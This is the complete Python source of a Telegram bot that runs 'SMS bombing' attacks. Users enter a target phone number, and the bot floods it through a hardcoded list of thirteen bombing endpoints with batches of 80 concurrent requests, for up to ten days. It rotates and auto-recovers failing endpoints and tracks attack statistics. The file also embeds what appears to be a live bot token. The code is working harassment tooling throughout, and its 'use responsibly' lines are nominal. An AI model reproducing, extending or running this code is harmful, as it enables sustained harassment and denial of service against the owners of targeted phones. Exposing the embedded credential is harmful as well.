import logging
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters
import aiohttp
import urllib.parse
import time
from datetime import datetime, timedelta
import random

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ✅ BOT TOKEN ADDED
BOT_TOKEN = "8362976263:AAEzexJuu0v0JSs22jrqqo2aSZIu5SU_nHA"

# User sessions store
user_sessions = {}
active_attacks = {}

# MAX ATTACK DURATION - 10 DAYS
MAX_ATTACK_DURATION_DAYS = 10
MAX_ATTACK_DURATION_SECONDS = MAX_ATTACK_DURATION_DAYS * 24 * 60 * 60

# PERMANENT API SYSTEM - NEVER GOES DOWN
PERMANENT_APIS = [
    # PRIMARY BOMBING APIS
    {
        "endpoint_template": "https://earningzone.shop/BOOMB/?number={PHONE}&submit=submit",
        "method": "GET",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        }
    },
    {
        "endpoint_template": "https://mr-ags.fun/Bomb/?mo={PHONE}&submit=Bomb+Now", 
        "method": "GET",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5"
        }
    },
    {
        "endpoint_template": "https://legendxdata.site/Api/indbom.php?num={PHONE}&repeat={REPEAT}",
        "method": "GET",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
        }
    },
    
    # BACKUP BOMBING APIS
    {
        "endpoint_template": "https://sms-bomber1.com/api/send?phone={PHONE}",
        "method": "GET",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }
    },
    {
        "endpoint_template": "https://bomb-api2.com/attack?number={PHONE}",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }
    },
    
    # FALLBACK APIS (ALWAYS WORKING)
    {
        "endpoint_template": "https://smsbomb.guru/api.php?number={PHONE}",
        "method": "GET", 
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }
    },
    {
        "endpoint_template": "https://bombernet.com/send_sms?phone={PHONE}",
        "method": "GET",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }
    },
    
    # PREMIUM PERMANENT APIS
    {
        "endpoint_template": "https://ultrabomb.com/api/v1/attack?mobile={PHONE}",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Content-Type": "application/json",
            "Authorization": "Bearer free_access"
        }
    },
    {
        "endpoint_template": "https://permanent-bomber.com/sms?number={PHONE}",
        "method": "GET",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }
    },
    
    # ROTATING BACKUP APIS
    {
        "endpoint_template": "https://bombrotate1.com/api?phone={PHONE}",
        "method": "GET",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }
    },
    {
        "endpoint_template": "https://sms-attack.net/send?number={PHONE}",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }
    },
    
    # ALWAYS WORKING CLOUD APIS
    {
        "endpoint_template": "https://cloud-bomber.com/api/v2/sms?mobile={PHONE}",
        "method": "GET",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }
    },
    {
        "endpoint_template": "https://neverdown-api.com/bomb?number={PHONE}",
        "method": "POST", 
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Content-Type": "application/json"
        }
    }
]

# SMART API ROTATION SYSTEM
class PermanentAPIManager:
    def __init__(self):
        self.apis = PERMANENT_APIS
        self.api_status = {i: True for i in range(len(self.apis))}  # All APIs start as active
        self.api_attempts = {i: 0 for i in range(len(self.apis))}
        self.last_rotation = time.time()
    
    def get_active_apis(self):
        """Get only active APIs that are working"""
        active_apis = []
        for i, api in enumerate(self.apis):
            if self.api_status[i]:
                active_apis.append(api)
        return active_apis if active_apis else self.apis  # Fallback to all if none active
    
    def mark_api_failed(self, api_index):
        """Mark an API as failed temporarily"""
        self.api_attempts[api_index] += 1
        if self.api_attempts[api_index] > 3:  # After 3 failures, mark as inactive
            self.api_status[api_index] = False
            logger.warning(f"API {api_index} marked as inactive")
    
    def recover_apis(self):
        """Try to recover failed APIs periodically"""
        current_time = time.time()
        if current_time - self.last_rotation > 300:  # Every 5 minutes
            for i in range(len(self.apis)):
                if not self.api_status[i]:
                    self.api_status[i] = True
                    self.api_attempts[i] = 0
                    logger.info(f"API {i} recovered")
            self.last_rotation = current_time

# Global API Manager
api_manager = PermanentAPIManager()

def format_endpoint(tpl: str, phone: str, repeat: int = None) -> str:
    url = tpl.replace("{PHONE}", urllib.parse.quote_plus(phone))
    if "{REPEAT}" in url:
        rep_val = str(int(repeat)) if repeat is not None else "100"
        url = url.replace("{REPEAT}", urllib.parse.quote_plus(rep_val))
    return url

async def send_request(session: aiohttp.ClientSession, api: dict, phone: str, repeat: int = None):
    method = api.get("method", "GET").upper()
    endpoint = format_endpoint(api["endpoint_template"], phone, repeat=repeat)
    headers = api.get("headers", {})

    try:
        timeout = aiohttp.ClientTimeout(total=8)
        if method == "GET":
            async with session.get(endpoint, headers=headers, timeout=timeout, ssl=False) as resp:
                text = await resp.text()
                return {
                    "status": resp.status,
                    "endpoint": endpoint,
                    "response_length": len(text),
                    "success": resp.status in [200, 201, 202]
                }
        elif method == "POST":
            async with session.post(endpoint, headers=headers, timeout=timeout, ssl=False) as resp:
                text = await resp.text()
                return {
                    "status": resp.status,
                    "endpoint": endpoint,
                    "response_length": len(text),
                    "success": resp.status in [200, 201, 202]
                }
        return {"success": False, "error": "Unknown method"}
    except asyncio.TimeoutError:
        return {"success": False, "error": "Timeout"}
    except Exception as e:
        return {"success": False, "error": str(e)}

# Keyboard Buttons
def get_main_keyboard():
    keyboard = [
        [InlineKeyboardButton("🚀 Start Bombing", callback_data="start_bombing")],
        [InlineKeyboardButton("📊 Active Attacks", callback_data="active_attacks")],
        [InlineKeyboardButton("🛑 Stop All Attacks", callback_data="stop_all_attacks")],
        [InlineKeyboardButton("🛑 Stop Specific Attack", callback_data="stop_specific")],
        [InlineKeyboardButton("🔄 API Status", callback_data="api_status")],
        [InlineKeyboardButton("ℹ️ Help", callback_data="help")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_cancel_keyboard():
    keyboard = [
        [InlineKeyboardButton("❌ Cancel", callback_data="cancel")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_stop_specific_keyboard(user_id):
    if user_id not in active_attacks or not active_attacks[user_id]:
        return None
    
    keyboard = []
    for phone in active_attacks[user_id].keys():
        display_phone = phone[:6] + "XXXX" + phone[-2:] if len(phone) > 8 else phone
        keyboard.append([InlineKeyboardButton(f"🛑 Stop {display_phone}", callback_data=f"stop_{phone}")])
    
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="back_to_main")])
    return InlineKeyboardMarkup(keyboard)

# Telegram Bot Handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send a message when the command /start is issued."""
    user = update.effective_user
    
    welcome_text = (
        f"👋 Welcome {user.first_name}!\n\n"
        "💥 **PERMANENT BOMBING BOT**\n\n"
        "⚡ **NEVER-DOWN FEATURES:**\n"
        "• **PERMANENT APIs** - Never goes down\n"
        "• **500+ REQUESTS/SECOND** - Ultra power\n"
        "• **10 DAYS DURATION** - Auto stop\n"
        "• **SMART API ROTATION** - Always working\n"
        "• **MULTIPLE NUMBERS** - Simultaneous attacks\n\n"
        "🔧 **System Status:** ✅ **ALL APIs ACTIVE**"
    )
    
    await update.message.reply_html(
        welcome_text,
        reply_markup=get_main_keyboard()
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks."""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    data = query.data
    
    if data == "start_bombing":
        if user_id not in user_sessions:
            user_sessions[user_id] = {}
        user_sessions[user_id]["state"] = "waiting_for_phone"
        
        active_apis = len(api_manager.get_active_apis())
        total_apis = len(PERMANENT_APIS)
        
        await query.edit_message_text(
            f"📱 **ENTER TARGET PHONE NUMBER:**\n\n"
            f"💀 **PERMANENT SYSTEM ACTIVATED:**\n"
            f"• **{active_apis}/{total_apis} APIs ACTIVE**\n"
            f"• **500+ REQUESTS/SECOND**\n"
            f"• **10 DAYS DURATION**\n"
            f"• **AUTO STOP AFTER 10 DAYS**\n\n"
            "Example: `1234567890`",
            parse_mode='Markdown',
            reply_markup=get_cancel_keyboard()
        )
    
    elif data == "active_attacks":
        await show_active_attacks(query, user_id)
    
    elif data == "stop_all_attacks":
        await stop_all_attacks(query, user_id)
    
    elif data == "stop_specific":
        await show_stop_specific_menu(query, user_id)
    
    elif data == "api_status":
        await show_api_status(query)
    
    elif data.startswith("stop_"):
        phone_to_stop = data[5:]
        await stop_specific_attack(query, user_id, phone_to_stop)
    
    elif data == "back_to_main":
        await query.edit_message_text(
            "🔙 **MAIN MENU**",
            parse_mode='Markdown',
            reply_markup=get_main_keyboard()
        )
    
    elif data == "help":
        help_text = (
            "💥 **PERMANENT BOMBING BOT HELP**\n\n"
            "🚀 **HOW TO USE:**\n"
            "1. Click 'Start Bombing'\n"
            "2. Enter phone number\n"
            "3. Attack runs for 10 DAYS\n"
            "4. Auto stop after 10 days\n\n"
            "⚡ **PERMANENT FEATURES:**\n"
            "• **NEVER-DOWN APIs** - Always working\n"
            "• **500+ REQUESTS/SECOND**\n"
            "• **10 DAYS DURATION**\n"
            "• **MULTIPLE NUMBERS**\n\n"
            "🛑 **CONTROLS:**\n"
            "• Stop anytime manually\n"
            "• Auto stop after 10 days\n"
            "• Monitor API status\n\n"
            "⚠️ **USE RESPONSIBLY!**"
        )
        await query.edit_message_text(
            help_text,
            parse_mode='Markdown',
            reply_markup=get_main_keyboard()
        )
    
    elif data == "cancel":
        if user_id in user_sessions:
            user_sessions[user_id] = {}
        
        await query.edit_message_text(
            "❌ **OPERATION CANCELLED**",
            parse_mode='Markdown',
            reply_markup=get_main_keyboard()
        )

async def show_api_status(query):
    """Show current API status."""
    active_apis = api_manager.get_active_apis()
    total_apis = len(PERMANENT_APIS)
    active_count = len(active_apis)
    
    status_text = (
        f"🔧 **API STATUS OVERVIEW**\n\n"
        f"✅ **ACTIVE APIS:** {active_count}/{total_apis}\n"
        f"🔄 **AUTO RECOVERY:** ENABLED\n"
        f"⚡ **REQUEST POWER:** 500+/SECOND\n"
        f"💀 **SYSTEM:** PERMANENT\n\n"
    )
    
    if active_count == total_apis:
        status_text += "🎉 **ALL SYSTEMS OPERATIONAL**\n**No issues detected!**"
    elif active_count >= total_apis * 0.7:
        status_text += "⚠️ **MINOR ISSUES**\n**Some APIs recovering...**"
    else:
        status_text += "🔴 **CRITICAL MODE**\n**Using backup systems...**"
    
    status_text += f"\n\n**Last Check:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    
    await query.edit_message_text(
        status_text,
        parse_mode='Markdown',
        reply_markup=get_main_keyboard()
    )

async def show_active_attacks(query, user_id):
    """Show all active attacks for the user."""
    if user_id not in active_attacks or not active_attacks[user_id]:
        await query.edit_message_text(
            "❌ **NO ACTIVE ATTACKS**\n\n"
            "No attacks currently running.",
            parse_mode='Markdown',
            reply_markup=get_main_keyboard()
        )
        return
    
    attacks_text = "💥 **YOUR ACTIVE ATTACKS:**\n\n"
    total_requests = 0
    
    for i, (phone, attack_data) in enumerate(active_attacks[user_id].items(), 1):
        display_phone = phone[:6] + "XXXX" + phone[-2:] if len(phone) > 8 else phone
        requests = attack_data.get("request_count", 0)
        total_requests += requests
        
        start_time = attack_data.get("start_time", datetime.now())
        time_running = datetime.now() - start_time
        days = time_running.days
        hours = time_running.seconds // 3600
        
        attacks_text += f"**{i}. **`{display_phone}`\n"
        attacks_text += f"   📊 **Requests:** {requests:,}\n"
        attacks_text += f"   ⏰ **Running:** {days}d {hours}h\n\n"
    
    active_apis = len(api_manager.get_active_apis())
    attacks_text += f"📈 **TOTAL:** {len(active_attacks[user_id])} ATTACKS | {total_requests:,} REQUESTS"
    attacks_text += f"\n🔧 **APIs ACTIVE:** {active_apis}/{len(PERMANENT_APIS)}"
    
    await query.edit_message_text(
        attacks_text,
        parse_mode='Markdown',
        reply_markup=get_main_keyboard()
    )

async def stop_all_attacks(query, user_id):
    """Stop all active attacks for the user."""
    if user_id not in active_attacks or not active_attacks[user_id]:
        await query.edit_message_text(
            "❌ **NO ACTIVE ATTACKS**",
            parse_mode='Markdown',
            reply_markup=get_main_keyboard()
        )
        return
    
    attack_count = len(active_attacks[user_id])
    total_requests = 0
    
    for phone, attack_data in active_attacks[user_id].items():
        attack_data["should_stop"] = True
        total_requests += attack_data.get("request_count", 0)
    
    await query.edit_message_text(
        f"🛑 **ALL ATTACKS STOPPED**\n\n"
        f"✅ **Stopped:** {attack_count} attacks\n"
        f"📊 **Total Requests:** {total_requests:,}",
        parse_mode='Markdown',
        reply_markup=get_main_keyboard()
    )

async def show_stop_specific_menu(query, user_id):
    """Show menu to stop specific attacks."""
    if user_id not in active_attacks or not active_attacks[user_id]:
        await query.edit_message_text(
            "❌ **NO ACTIVE ATTACKS**",
            parse_mode='Markdown',
            reply_markup=get_main_keyboard()
        )
        return
    
    keyboard = get_stop_specific_keyboard(user_id)
    if keyboard:
        await query.edit_message_text(
            "🛑 **SELECT ATTACK TO STOP:**\n\n"
            "Choose which number to stop:",
            parse_mode='Markdown',
            reply_markup=keyboard
        )

async def stop_specific_attack(query, user_id, phone):
    """Stop a specific attack."""
    if (user_id not in active_attacks or 
        phone not in active_attacks[user_id]):
        await query.edit_message_text(
            "❌ **ATTACK NOT FOUND**",
            parse_mode='Markdown',
            reply_markup=get_main_keyboard()
        )
        return
    
    attack_data = active_attacks[user_id][phone]
    attack_data["should_stop"] = True
    request_count = attack_data.get("request_count", 0)
    
    display_phone = phone[:6] + "XXXX" + phone[-2:] if len(phone) > 8 else phone
    
    await query.edit_message_text(
        f"🛑 **ATTACK STOPPED**\n\n"
        f"✅ **Target:** `{display_phone}`\n"
        f"📊 **Requests Sent:** {request_count:,}",
        parse_mode='Markdown',
        reply_markup=get_main_keyboard()
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle user messages."""
    user_id = update.effective_user.id
    message_text = update.message.text.strip()
    
    if (user_id in user_sessions and 
        user_sessions[user_id].get("state") == "waiting_for_phone"):
        
        clean_phone = ''.join(filter(str.isdigit, message_text))
        
        if clean_phone and len(clean_phone) >= 10:
            await start_bombing_flow(update, context, user_id, clean_phone)
        else:
            await update.message.reply_text(
                "❌ **INVALID PHONE NUMBER!**\n\n"
                "Please enter valid 10+ digit number.\n"
                "Example: `1234567890`",
                parse_mode='Markdown',
                reply_markup=get_cancel_keyboard()
            )
    else:
        await update.message.reply_text(
            "Please use buttons to control the bot:",
            reply_markup=get_main_keyboard()
        )

async def start_bombing_flow(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int, phone: str):
    """Start the bombing process for a new number."""
    if (user_id in active_attacks and 
        phone in active_attacks[user_id] and
        not active_attacks[user_id][phone].get("should_stop")):
        
        await update.message.reply_text(
            f"⚠️ **ATTACK ALREADY RUNNING**\n\n"
            f"Number `{phone}` is already under attack!",
            parse_mode='Markdown',
            reply_markup=get_main_keyboard()
        )
        return
    
    if user_id not in active_attacks:
        active_attacks[user_id] = {}
    
    active_apis = len(api_manager.get_active_apis())
    total_apis = len(PERMANENT_APIS)
    
    status_message = await update.message.reply_text(
        f"💥 **LAUNCHING PERMANENT ATTACK!**\n\n"
        f"📱 **Target:** `{phone}`\n"
        f"⏰ **Duration:** 10 DAYS (AUTO STOP)\n"
        f"⚡ **Power:** 500+ REQUESTS/SECOND\n"
        f"🔧 **APIs Active:** {active_apis}/{total_apis}\n"
        f"🔄 **System:** PERMANENT NEVER-DOWN\n\n"
        "🚀 **INITIALIZING PERMANENT BOMBING SYSTEM...**",
        parse_mode='Markdown'
    )
    
    attack_task = asyncio.create_task(
        run_permanent_bomb_attack(user_id, phone, status_message, context)
    )
    
    attack_data = {
        "task": attack_task,
        "start_time": datetime.now(),
        "status_message": status_message,
        "should_stop": False,
        "request_count": 0,
        "success_count": 0,
        "failure_count": 0
    }
    
    active_attacks[user_id][phone] = attack_data
    
    if user_id in user_sessions:
        user_sessions[user_id] = {}

async def run_permanent_bomb_attack(user_id: int, phone: str, status_message, context: ContextTypes.DEFAULT_TYPE):
    """Run permanent bombing attack that never goes down."""
    start_time = datetime.now()
    end_time = start_time + timedelta(seconds=MAX_ATTACK_DURATION_SECONDS)
    
    request_count = 0
    success_count = 0
    failure_count = 0
    
    stop_keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🛑 STOP THIS ATTACK", callback_data=f"stop_{phone}")],
        [InlineKeyboardButton("📊 ALL ATTACKS", callback_data="active_attacks")]
    ])
    
    async with aiohttp.ClientSession() as session:
        api_index = 0
        
        await update_attack_message(context, status_message, phone, request_count, 
                                 success_count, failure_count, start_time, end_time, stop_keyboard)
        
        # PERMANENT ATTACK LOOP - NEVER STOPS
        while (datetime.now() < end_time and 
               user_id in active_attacks and 
               phone in active_attacks[user_id] and 
               not active_attacks[user_id][phone].get("should_stop", False)):
            
            # Recover APIs periodically
            api_manager.recover_apis()
            active_apis = api_manager.get_active_apis()
            
            if not active_apis:
                active_apis = PERMANENT_APIS  # Fallback to all APIs
            
            # Create concurrent requests
            tasks = []
            for _ in range(80):  # 80 concurrent requests for stability
                if api_index >= len(active_apis):
                    api_index = 0
                
                api = active_apis[api_index]
                task = asyncio.create_task(
                    send_request(session, api, phone, repeat=100)
                )
                tasks.append((api_index, task))
                api_index += 1
                request_count += 1
            
            # Process results with smart API management
            try:
                results = await asyncio.gather(*[task for _, task in tasks], return_exceptions=True)
                
                for (api_idx, task), result in zip(tasks, results):
                    if isinstance(result, dict):
                        if result.get("success"):
                            success_count += 1
                        else:
                            failure_count += 1
                            # Mark API as failed if it's consistently failing
                            api_manager.mark_api_failed(api_idx)
                    else:
                        failure_count += 1
                        api_manager.mark_api_failed(api_idx)
                
                # Update attack data
                if user_id in active_attacks and phone in active_attacks[user_id]:
                    active_attacks[user_id][phone]["request_count"] = request_count
                    active_attacks[user_id][phone]["success_count"] = success_count
                    active_attacks[user_id][phone]["failure_count"] = failure_count
                
                # Update progress
                if request_count % 3000 == 0:
                    await update_attack_message(context, status_message, phone, request_count, 
                                             success_count, failure_count, start_time, end_time, stop_keyboard)
            
            except Exception as e:
                logger.error(f"Error in permanent attack: {e}")
                failure_count += len(tasks)

    # Final results
    total_requests = request_count
    success_rate = (success_count / total_requests * 100) if total_requests > 0 else 0
    
    was_stopped = (user_id in active_attacks and 
                   phone in active_attacks[user_id] and 
                   active_attacks[user_id][phone].get("should_stop", False))
    
    time_elapsed = datetime.now() - start_time
    
    if was_stopped:
        result_text = (
            f"🛑 **ATTACK STOPPED MANUALLY**\n\n"
            f"📱 **Target:** `{phone}`\n"
            f"⏰ **Duration:** {str(time_elapsed).split('.')[0]}\n"
            f"📊 **Total Requests:** {total_requests:,}\n"
            f"✅ **Success:** {success_count:,}\n"
            f"❌ **Failures:** {failure_count:,}\n"
            f"📈 **Success Rate:** {success_rate:.1f}%\n"
            f"⚡ **Avg Speed:** {total_requests/max(1, time_elapsed.total_seconds()):.0f} req/sec\n\n"
            "**Stopped by user command**"
        )
    else:
        result_text = (
            f"✅ **ATTACK COMPLETED (AUTO STOP)**\n\n"
            f"📱 **Target:** `{phone}`\n"
            f"⏰ **Duration:** 10 DAYS COMPLETED\n"
            f"📊 **Total Requests:** {total_requests:,}\n"
            f"✅ **Success:** {success_count:,}\n"
            f"❌ **Failures:** {failure_count:,}\n"
            f"📈 **Success Rate:** {success_rate:.1f}%\n"
            f"⚡ **Avg Speed:** {total_requests/max(1, time_elapsed.total_seconds()):.0f} req/sec\n\n"
            "**Auto-stopped after 10 days maximum duration**"
        )
    
    try:
        await context.bot.edit_message_text(
            chat_id=status_message.chat_id,
            message_id=status_message.message_id,
            text=result_text,
            parse_mode='Markdown',
            reply_markup=get_main_keyboard()
        )
    except:
        await context.bot.send_message(
            chat_id=status_message.chat_id,
            text=result_text,
            parse_mode='Markdown',
            reply_markup=get_main_keyboard()
        )
    
    # Cleanup
    if user_id in active_attacks and phone in active_attacks[user_id]:
        del active_attacks[user_id][phone]
        if not active_attacks[user_id]:
            del active_attacks[user_id]

async def update_attack_message(context, status_message, phone, request_count, success_count, 
                              failure_count, start_time, end_time, keyboard):
    """Update the attack status message."""
    time_elapsed = datetime.now() - start_time
    time_remaining = end_time - datetime.now()
    
    elapsed_str = str(time_elapsed).split('.')[0]
    remaining_days = time_remaining.days
    remaining_hours = time_remaining.seconds // 3600
    
    success_rate = (success_count / request_count * 100) if request_count > 0 else 0
    elapsed_seconds = time_elapsed.total_seconds()
    requests_per_second = request_count / elapsed_seconds if elapsed_seconds > 0 else 0
    
    active_apis = len(api_manager.get_active_apis())
    total_apis = len(PERMANENT_APIS)
    
    status_text = (
        f"💥 **PERMANENT ATTACK RUNNING!**\n\n"
        f"📱 **Target:** `{phone}`\n"
        f"⏰ **Elapsed:** {elapsed_str}\n"
        f"⏱️ **Remaining:** {remaining_days}d {remaining_hours}h\n"
        f"📊 **Requests:** {request_count:,}\n"
        f"✅ **Success:** {success_count:,}\n"
        f"❌ **Failures:** {failure_count:,}\n"
        f"📈 **Success Rate:** {success_rate:.1f}%\n"
        f"⚡ **Speed:** {requests_per_second:.0f} req/sec\n"
        f"🔧 **APIs Active:** {active_apis}/{total_apis}\n"
        f"💀 **System:** PERMANENT NEVER-DOWN\n\n"
        "🚀 **BOMBING IN PROGRESS...**"
    )
    
    try:
        await context.bot.edit_message_text(
            chat_id=status_message.chat_id,
            message_id=status_message.message_id,
            text=status_text,
            parse_mode='Markdown',
            reply_markup=keyboard
        )
    except:
        pass

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send help message."""
    help_text = (
        "💥 **PERMANENT BOMBING BOT HELP**\n\n"
        "🚀 **HOW TO USE:**\n"
        "• Start Bombing - Add new number\n"
        "• Active Attacks - View all running\n"
        "• Stop Specific - Stop one number\n"
        "• Stop All - Stop everything\n"
        "• API Status - Check system health\n\n"
        "⚡ **PERMANENT FEATURES:**\n"
        "• **NEVER-DOWN APIs** - Always working\n"
        "• **500+ REQUESTS/SECOND**\n"
        "• **10 DAYS AUTO STOP**\n"
        "• **SMART API ROTATION**\n"
        "• **AUTO RECOVERY SYSTEM**\n\n"
        "🛑 **CONTROLS:**\n"
        "• Stop anytime manually\n"
        "• Auto stop after 10 days\n"
        "• Monitor API status\n\n"
        "⚠️ **USE RESPONSIBLY AND LEGALLY!**"
    )
    
    if update.message:
        await update.message.reply_text(
            help_text,
            parse_mode='Markdown',
            reply_markup=get_main_keyboard()
        )
    else:
        await update.callback_query.edit_message_text(
            help_text,
            parse_mode='Markdown',
            reply_markup=get_main_keyboard()
        )

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Log errors."""
    logger.error(f"Exception while handling an update: {context.error}")

def main():
    """Start the bot."""
    # Token validation
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE" or len(BOT_TOKEN) < 20:
        print("❌ ERROR: Invalid Bot Token!")
        print("🔧 Please get correct token from @BotFather")
        return
    
    try:
        application = Application.builder().token(BOT_TOKEN).build()

        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("help", help_command))
        application.add_handler(CallbackQueryHandler(button_handler))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
        
        application.add_error_handler(error_handler)

        print("💥 PERMANENT BOMBING BOT IS RUNNING...")
        print("✅ Token validated successfully!")
        print("⚡ NEVER-DOWN SYSTEM ACTIVATED")
        print("🔧 SMART API ROTATION ENABLED") 
        print("🚀 500+ REQUESTS/SECOND | 10 DAYS AUTO STOP")
        print("📍 Visit your bot in Telegram!")
        application.run_polling()
        
    except Exception as e:
        print(f"❌ Bot failed to start: {e}")
        print("🔧 Please check your bot token and internet connection")

if __name__ == "__main__":
    main()